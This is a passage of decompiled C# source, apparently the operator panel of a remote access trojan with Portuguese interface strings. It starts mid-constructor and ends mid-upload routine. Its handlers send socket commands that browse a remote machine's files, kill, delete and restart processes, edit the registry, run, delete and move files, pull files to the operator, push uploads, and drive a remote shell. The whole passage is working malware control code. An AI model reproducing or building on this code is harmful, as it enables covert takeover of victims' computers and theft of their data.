			this.string_1 = new string[5];
			this.int_0 = 0;
			this.int_1 = 0;
			this.cur = Manager.CR.fm;
			this.shStarted = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000268 RID: 616 RVA: 0x001ED860 File Offset: 0x001EBC60
		public void exp(string x, bool Refresh = false)
		{
			try
			{
				string text = x.Replace("\\\\", "\\");
				bool flag = !text.EndsWith("\\");
				if (flag)
				{
					text += "\\";
				}
				this.TextBox1.Text = text;
				ToolStripProgressBar pr = this.pr;
				ToolStripProgressBar obj = pr;
				lock (obj)
				{
					this.p.Image = null;
					this.p.Visible = false;
					this.TextBox1.BackColor = Color.IndianRed;
					flag = (Refresh && this.Cache.Contains(text));
					if (flag)
					{
						this.Cache.Remove(text);
					}
					flag = this.Cache.Contains(text);
					if (flag)
					{
						this.TextBox1.BackColor = Color.Pink;
						Manager.GClass14 gclass = (Manager.GClass14)this.Cache[text];
						this.pr.Value = 0;
						this.pr.Maximum = gclass.list_1.Count + gclass.list_0.Count;
						this.L2.Items.Clear();
						flag = (new DirectoryInfo(text).Parent != null);
						if (flag)
						{
							ListViewItem listViewItem = this.L2.Items.Add("..", "..", 0);
							listViewItem.SubItems.Add(string.Empty);
							listViewItem.SubItems.Add("DIR");
							listViewItem.ToolTipText = new DirectoryInfo(text).Parent.FullName + "\\";
						}
						try
						{
							foreach (string text2 in gclass.list_0)
							{
								ToolStripProgressBar pr2 = this.pr;
								ToolStripProgressBar toolStripProgressBar = pr2;
								toolStripProgressBar.Value++;
								ListViewItem listViewItem2 = this.L2.Items.Add(text2, new DirectoryInfo(text2).Name, 0);
								listViewItem2.SubItems.Add(string.Empty);
								listViewItem2.SubItems.Add("DIR");
								listViewItem2.ToolTipText = text2;
							}
						}
						finally
						{
							List<string>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						List<ListViewItem> list = new List<ListViewItem>();
						bool flag2;
						try
						{
							foreach (string expression in gclass.list_1)
							{
								ToolStripProgressBar pr2 = this.pr;
								ToolStripProgressBar toolStripProgressBar = pr2;
								toolStripProgressBar.Value++;
								string[] array = Strings.Split(expression, "*", -1, CompareMethod.Binary);
								FileInfo fileInfo = new FileInfo(array[0]);
								ListViewItem listViewItem3 = new ListViewItem(fileInfo.Name, 1);
								ListViewItem listViewItem4 = listViewItem3;
								listViewItem4.ToolTipText = fileInfo.FullName;
								listViewItem4.SubItems.Add(array[1]);
								listViewItem4.SubItems.Add(array[2]);
								listViewItem4.Name = listViewItem4.ToolTipText;
								flag = this.Images.Contains("!" + listViewItem4.ToolTipText);
								if (flag)
								{
									try
									{
										flag2 = !this.vmethod_108.Images.ContainsKey(listViewItem4.ToolTipText);
										if (flag2)
										{
											object[] array2 = new object[2];
											ListViewItem listViewItem5 = listViewItem4;
											array2[0] = listViewItem5.ToolTipText;
											array2[1] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(this.Images[listViewItem4.ToolTipText])));
											object[] array3 = array2;
											bool[] array4 = new bool[]
											{
												true,
												false
											};
											NewLateBinding.LateCall(this.vmethod_108.Images, null, "Add", array3, null, null, array4, true);
											flag2 = array4[0];
											if (flag2)
											{
												listViewItem5.ToolTipText = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3[0]))), typeof(string)));
											}
										}
									}
									catch (Exception ex)
									{
									}
									listViewItem4.ImageKey = listViewItem4.ToolTipText;
								}
								else
								{
									flag2 = (fileInfo.Extension.Length > 0);
									if (flag2)
									{
										flag = !this.vmethod_108.Images.ContainsKey(fileInfo.Extension);
										if (flag)
										{
											File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
											this.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
											File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
											listViewItem4.ImageKey = fileInfo.Extension;
										}
										else
										{
											listViewItem4.ImageKey = fileInfo.Extension;
										}
									}
								}
								listViewItem4 = null;
								list.Add(listViewItem3);
								flag2 = (list.Count > 20);
								if (flag2)
								{
									this.L2.Items.AddRange(list.ToArray());
									list.Clear();
								}
							}
						}
						finally
						{
							List<string>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
						flag2 = (list.Count > 0);
						if (flag2)
						{
							this.L2.Items.AddRange(list.ToArray());
							list.Clear();
						}
						this.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						this.pr.Value = 0;
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"Ex",
							Class7.string_1,
							"fm",
							Class7.string_1,
							"!",
							Class7.string_1,
							Class6.smethod_14(ref text)
						}));
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000269 RID: 617 RVA: 0x001EDF14 File Offset: 0x001EC314
		private void Manager_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.Images.Clear();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.Cache.Clear();
			}
			catch (Exception ex2)
			{
			}
			bool flag = this.sk != null && this.sk.CN;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"rs",
					Class7.string_1,
					"@"
				}));
			}
		}

		// Token: 0x0600026A RID: 618 RVA: 0x001EDFE4 File Offset: 0x001EC3E4
		private void Manager_Load(object sender, EventArgs e)
		{
			try
			{
				this.LPR.Tag = null;
				this.LTCP.Tag = null;
				this.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT");
				this.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER");
				this.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE");
				this.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS");
				this.L2.Controls.Add(this.p);
				this.ListView1.Items[0].Selected = true;
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"~"
				}));
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"~"
				}));
				this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.sk.L)));
				this.L2.Controls.Add(this.p);
				this.p.Visible = false;
				try
				{
					this.string_0 = this.sk.Folder + "Baixados\\";
				}
				catch (Exception ex)
				{
				}
				this.vmethod_26.Enabled = true;
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600026B RID: 619 RVA: 0x001EE1FC File Offset: 0x001EC5FC
		private void Manager_Resize(object sender, EventArgs e)
		{
			this.p.Left = this.L2.Width - this.p.Width - 25;
			this.p.Top = this.L2.Height - this.p.Height - 25;
		}

		// Token: 0x0600026C RID: 620 RVA: 0x001EE258 File Offset: 0x001EC658
		private void KillToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.LPR.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + Class7.string_1 + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"k",
					text
				}));
			}
		}

		// Token: 0x0600026D RID: 621 RVA: 0x001EE344 File Offset: 0x001EC744
		private void KillDeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.LPR.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						Class7.string_1,
						listViewItem.SubItems[1].Text,
						"::",
						listViewItem.ToolTipText
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"kd",
					text
				}));
			}
		}

		// Token: 0x0600026E RID: 622 RVA: 0x001EE458 File Offset: 0x001EC858
		private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.TextBox1.Text.Length > 0;
			if (flag)
			{
				this.exp(this.TextBox1.Text, true);
			}
		}

		// Token: 0x0600026F RID: 623 RVA: 0x001EE494 File Offset: 0x001EC894
		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
		}

		// Token: 0x06000270 RID: 624 RVA: 0x001EE4B0 File Offset: 0x001EC8B0
		private void RGLIST_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.RGLIST.SelectedItems.Count != 0;
			if (flag)
			{
				ListViewItem listViewItem = this.RGLIST.SelectedItems[0];
				RGv rgv = new RGv
				{
					Path = this.RGk.SelectedNode.FullPath + "\\",
					sk = this.sk
				};
				rgv.TextBox1.Text = listViewItem.Text;
				rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf(listViewItem.SubItems[1].Text);
				try
				{
					rgv.TextBox3.Text = listViewItem.SubItems[2].Text;
				}
				catch (Exception ex)
				{
				}
				rgv.Text = rgv.Path;
				rgv.TextBox1.ReadOnly = true;
				rgv.ShowDialog(this);
			}
		}

		// Token: 0x06000271 RID: 625 RVA: 0x001EE5C8 File Offset: 0x001EC9C8
		private void NewValueToolStripMenuItem_Click(object sender, EventArgs e)
		{
			RGv rgv = new RGv
			{
				Path = this.RGk.SelectedNode.FullPath + "\\",
				sk = this.sk
			};
			rgv.TextBox1.Text = "Nome";
			rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf("String");
			rgv.TextBox3.Text = "Valor";
			rgv.Text = rgv.Path;
			rgv.ShowDialog(this);
		}

		// Token: 0x06000272 RID: 626 RVA: 0x001EE664 File Offset: 0x001ECA64
		private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.RGLIST.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"@",
						Class7.string_1,
						this.RGk.SelectedNode.FullPath,
						"\\",
						Class7.string_1,
						listViewItem.Text
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000273 RID: 627 RVA: 0x001EE754 File Offset: 0x001ECB54
		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			Keys keyCode = e.KeyCode;
			bool flag = keyCode == Keys.Return;
			if (flag)
			{
				string text = this.T2.Text;
				this.T2.Text = string.Empty;
				e.SuppressKeyPress = true;
				this.string_1[this.int_1] = text;
				this.int_1++;
				flag = (this.int_1 > this.string_1.Length - 1);
				if (flag)
				{
					this.int_1 = 0;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"rs",
					Class7.string_1,
					"!",
					Class7.string_1,
					Class6.smethod_14(ref text)
				}));
			}
			else
			{
				flag = (keyCode == Keys.Down);
				if (flag)
				{
					this.int_0 += -1;
					flag = (this.int_0 < 0);
					if (flag)
					{
						this.int_0 = 0;
					}
					this.T2.Text = this.string_1[this.int_0];
				}
				else
				{
					flag = (keyCode == Keys.Up);
					if (flag)
					{
						this.int_0++;
						flag = (this.int_0 > this.string_1.Length - 1);
						if (flag)
						{
							this.int_0 = this.string_1.Length - 1;
						}
						this.T2.Text = this.string_1[this.int_0];
					}
				}
			}
		}

		// Token: 0x06000274 RID: 628 RVA: 0x001EE8E4 File Offset: 0x001ECCE4
		private void sh_Resize(object sender, EventArgs e)
		{
			this.T1.ScrollToCaret();
		}

		// Token: 0x06000275 RID: 629 RVA: 0x001EE8F4 File Offset: 0x001ECCF4
		private void RGk_AfterCollapse(object sender, TreeViewEventArgs e)
		{
			bool flag = this.RGCH.Contains(e.Node.FullPath + "\\");
			Manager.GClass13 gclass;
			if (flag)
			{
				gclass = (Manager.GClass13)this.RGCH[e.Node.FullPath + "\\"];
			}
			flag = (gclass == null);
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					e.Node.FullPath,
					"\\"
				}));
			}
			else
			{
				flag = (gclass.list_0.Count == 0 & gclass.list_1.Count == 0);
				if (flag)
				{
					this.RGLIST.Items.Clear();
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						e.Node.FullPath,
						"\\"
					}));
				}
				else
				{
					this.RGLIST.Items.Clear();
					try
					{
						foreach (string[] array in gclass.list_0)
						{
							ListViewItem listViewItem = this.RGLIST.Items.Add(array[0]);
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							flag = (Operators.CompareString(array[1], "String", false) == 0);
							if (flag)
							{
								listViewItem.ImageIndex = 1;
							}
							else
							{
								listViewItem.ImageIndex = 2;
							}
						}
					}
					finally
					{
						List<string[]>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.RGLIST.method_3();
				}
			}
		}

		// Token: 0x06000276 RID: 630 RVA: 0x001EEB4C File Offset: 0x001ECF4C
		private void RGk_AfterExpand(object sender, TreeViewEventArgs e)
		{
			bool flag = this.RGCH.Contains(e.Node.FullPath + "\\");
			Manager.GClass13 gclass;
			if (flag)
			{
				gclass = (Manager.GClass13)this.RGCH[e.Node.FullPath + "\\"];
			}
			flag = (gclass == null);
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					e.Node.FullPath,
					"\\"
				}));
			}
			else
			{
				flag = (gclass.list_0.Count == 0 & gclass.list_1.Count == 0);
				if (flag)
				{
					this.RGLIST.Items.Clear();
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						e.Node.FullPath,
						"\\"
					}));
				}
				else
				{
					this.RGLIST.Items.Clear();
					try
					{
						foreach (string[] array in gclass.list_0)
						{
							ListViewItem listViewItem = this.RGLIST.Items.Add(array[0]);
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							flag = (Operators.CompareString(array[1], "String", false) == 0);
							if (flag)
							{
								listViewItem.ImageIndex = 1;
							}
							else
							{
								listViewItem.ImageIndex = 2;
							}
						}
					}
					finally
					{
						List<string[]>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.RGLIST.method_3();
				}
			}
		}

		// Token: 0x06000277 RID: 631 RVA: 0x001EEDA4 File Offset: 0x001ED1A4
		private void RGk_AfterSelect(object sender, TreeViewEventArgs e)
		{
			bool flag = this.RGCH.Contains(e.Node.FullPath + "\\");
			Manager.GClass13 gclass;
			if (flag)
			{
				gclass = (Manager.GClass13)this.RGCH[e.Node.FullPath + "\\"];
			}
			flag = (gclass == null);
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					e.Node.FullPath,
					"\\"
				}));
			}
			else
			{
				flag = (gclass.list_0.Count == 0 & gclass.list_1.Count == 0);
				if (flag)
				{
					this.RGLIST.Items.Clear();
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						e.Node.FullPath,
						"\\"
					}));
				}
				else
				{
					this.RGLIST.Items.Clear();
					try
					{
						foreach (string[] array in gclass.list_0)
						{
							ListViewItem listViewItem = this.RGLIST.Items.Add(array[0]);
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							flag = (Operators.CompareString(array[1], "String", false) == 0);
							if (flag)
							{
								listViewItem.ImageIndex = 1;
							}
							else
							{
								listViewItem.ImageIndex = 2;
							}
						}
					}
					finally
					{
						List<string[]>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.RGLIST.method_3();
					flag = !e.Node.IsExpanded;
					if (flag)
					{
						e.Node.Expand();
					}
				}
			}
		}

		// Token: 0x06000278 RID: 632 RVA: 0x001EF01C File Offset: 0x001ED41C
		private void RestartProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.LPR.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						Class7.string_1,
						listViewItem.SubItems[1].Text,
						"::",
						listViewItem.ToolTipText,
						"::",
						listViewItem.SubItems[4].Text
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (text.Length > 0);
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"re",
					text
				}));
			}
		}

		// Token: 0x06000279 RID: 633 RVA: 0x001EF14C File Offset: 0x001ED54C
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.RGk.Enabled = false;
				this.RGLIST.Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
			}
		}

		// Token: 0x0600027A RID: 634 RVA: 0x001EF1FC File Offset: 0x001ED5FC
		private void L2_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.L2.SelectedItems[0].SubItems[2].Text, "DIR", false) == 0;
				if (flag2)
				{
					this.exp(this.L2.SelectedItems[0].ToolTipText, false);
				}
				else
				{
					string[] array = new string[7];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "rd";
					array[5] = Class7.string_1;
					ListViewItem listViewItem = this.L2.SelectedItems[0];
					string toolTipText = listViewItem.ToolTipText;
					listViewItem.ToolTipText = toolTipText;
					array[6] = Class6.smethod_14(ref toolTipText);
					this.sk.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x0600027B RID: 635 RVA: 0x001EF2FC File Offset: 0x001ED6FC
		private void L2_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.p.Image = null;
			this.p.Visible = false;
			bool flag = this.L2.SelectedItems.Count == 1;
			if (flag)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				flag = this.Images.Contains(listViewItem.ToolTipText);
				if (flag)
				{
					this.p.Image = (Image)this.Images[listViewItem.ToolTipText];
					this.p.Visible = true;
				}
				else
				{
					flag = (listViewItem.SubItems[2].Text.Length > 0 && ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems[2].Text.ToLower()));
					if (flag)
					{
						string[] array = new string[11];
						array[0] = "Ex";
						array[1] = Class7.string_1;
						array[2] = "fm";
						array[3] = Class7.string_1;
						array[4] = "#";
						array[5] = Class7.string_1;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						listViewItem2.ToolTipText = toolTipText;
						array[6] = Class6.smethod_14(ref toolTipText);
						array[7] = Class7.string_1;
						array[8] = Conversions.ToString(this.p.Width);
						array[9] = Class7.string_1;
						array[10] = Conversions.ToString(this.p.Height);
						this.sk.Send(string.Concat(array));
					}
				}
			}
		}

		// Token: 0x0600027C RID: 636 RVA: 0x001EF490 File Offset: 0x001ED890
		private void UPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.Items.ContainsKey("..");
			if (flag)
			{
				this.exp(this.L2.Items[".."].ToolTipText, false);
			}
		}

		// Token: 0x0600027D RID: 637 RVA: 0x001EF4DC File Offset: 0x001ED8DC
		private void RunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"rn"
				});
				try
				{
					foreach (object obj in this.L2.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + Class7.string_1 + Class6.smethod_14(ref toolTipText);
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x0600027E RID: 638 RVA: 0x001EF5D8 File Offset: 0x001ED9D8
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L2.SelectedItems.Count <= 0;
				if (!flag)
				{
					string text = string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"fm",
						Class7.string_1,
						"dl",
						Class7.string_1
					});
					try
					{
						try
						{
							foreach (object obj in this.L2.SelectedItems)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0);
								if (flag)
								{
									bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
									if (flag2)
									{
										string str = text;
										string str2 = Class7.string_1;
										string text2 = listViewItem.ToolTipText + "*!";
										string str3 = Class6.smethod_14(ref text2);
										text = str + str2 + str3;
									}
									else
									{
										string str4 = text;
										string str5 = Class7.string_1;
										string text3 = listViewItem.ToolTipText + "*";
										string str6 = Class6.smethod_14(ref text3);
										text = str4 + str5 + str6;
									}
								}
							}
						}
						finally
						{
							IEnumerator enumerator;
							bool flag2 = enumerator is IDisposable;
							if (flag2)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					finally
					{
						IEnumerator enumerator2;
						bool flag2 = enumerator2 is IDisposable;
						if (flag2)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
					this.sk.Send(text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600027F RID: 639 RVA: 0x001EF7EC File Offset: 0x001EDBEC
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0;
					if (flag)
					{
						bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
						if (flag2)
						{
							string text = Interaction.InputBox(string.Empty, "Renomear", listViewItem.Text, -1, -1);
							flag2 = (text.Length > 0);
							if (flag2)
							{
								Client client = this.sk;
								string[] array = new string[7];
								array[0] = "Ex";
								array[1] = Class7.string_1;
								array[2] = "fm";
								array[3] = Class7.string_1;
								array[4] = "nm";
								array[5] = Class7.string_1;
								string[] array2 = array;
								int num = 6;
								string text2 = listViewItem.ToolTipText + "*" + text + "*!";
								array2[num] = Class6.smethod_14(ref text2);
								client.Send(string.Concat(array));
							}
						}
						else
						{
							string text3 = Interaction.InputBox(string.Empty, "Renomear", listViewItem.Text, -1, -1);
							flag2 = (text3.Length > 0);
							if (flag2)
							{
								Client client2 = this.sk;
								string[] array = new string[7];
								array[0] = "Ex";
								array[1] = Class7.string_1;
								array[2] = "fm";
								array[3] = Class7.string_1;
								array[4] = "nm";
								array[5] = Class7.string_1;
								string[] array3 = array;
								int num2 = 6;
								string text2 = listViewItem.ToolTipText + "*" + text3 + "*";
								array3[num2] = Class6.smethod_14(ref text2);
								client2.Send(string.Concat(array));
							}
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag2 = enumerator is IDisposable;
				if (flag2)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000280 RID: 640 RVA: 0x001EFA04 File Offset: 0x001EDE04
		private void SL_Click(object sender, EventArgs e)
		{
			this.SL.Text = string.Empty;
		}

		// Token: 0x06000281 RID: 641 RVA: 0x001EFA1C File Offset: 0x001EDE1C
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
					if (flag)
					{
						text = text + "*" + listViewItem.ToolTipText;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (Operators.CompareString(text, string.Empty, false) != 0);
			if (flag)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = false;
			}
		}

		// Token: 0x06000282 RID: 642 RVA: 0x001EFB08 File Offset: 0x001EDF08
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					flag = (Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
					if (flag)
					{
						text = text + "*" + listViewItem.ToolTipText;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				flag = (enumerator is IDisposable);
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			flag = (Operators.CompareString(text, string.Empty, false) != 0);
			if (flag)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = true;
			}
		}

		// Token: 0x06000283 RID: 643 RVA: 0x001EFBF4 File Offset: 0x001EDFF4
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Flist, string.Empty, false) != 0;
			if (flag)
			{
				bool flag2 = this.isCut;
				if (flag2)
				{
					Client client = this.sk;
					string[] array = new string[9];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "mv";
					array[5] = Class7.string_1;
					string[] array2 = array;
					int num = 6;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					array2[num] = Class6.smethod_14(ref text);
					array[7] = Class7.string_1;
					array[8] = Class6.smethod_14(ref this.Flist);
					client.Send(string.Concat(array));
				}
				else
				{
					Client client2 = this.sk;
					string[] array = new string[9];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "cp";
					array[5] = Class7.string_1;
					string[] array3 = array;
					int num2 = 6;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					array3[num2] = Class6.smethod_14(ref text);
					array[7] = Class7.string_1;
					array[8] = Class6.smethod_14(ref this.Flist);
					client2.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x06000284 RID: 644 RVA: 0x001EFD68 File Offset: 0x001EE168
		private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0;
					if (flag)
					{
						string[] array = new string[9];
						array[0] = "Ex";
						array[1] = Class7.string_1;
						array[2] = "fm";
						array[3] = Class7.string_1;
						array[4] = "dw";
						array[5] = Class7.string_1;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						listViewItem2.ToolTipText = toolTipText;
						array[6] = Class6.smethod_14(ref toolTipText);
						array[7] = Class7.string_1;
						array[8] = this.sk.ip();
						this.sk.Send(string.Concat(array));
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000285 RID: 645 RVA: 0x001EFEA4 File Offset: 0x001EE2A4
		private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L2.Items.Count == 0;
				if (!flag)
				{
					string text = this.TextBox1.Text;
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.FileName = string.Empty;
					openFileDialog.Multiselect = true;
					flag = (openFileDialog.ShowDialog() == DialogResult.OK);
					if (flag)
					{
						string[] fileNames = openFileDialog.FileNames;
						int num = 0;
						int num2 = fileNames.Length - 1;
						int num3 = num;
						for (;;)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							string text2 = fileNames[num3];
							flag = (FileSystem.FileLen(text2) != 0L);
							if (flag)
							{
								up up = new up();
								up.TMP = text2;
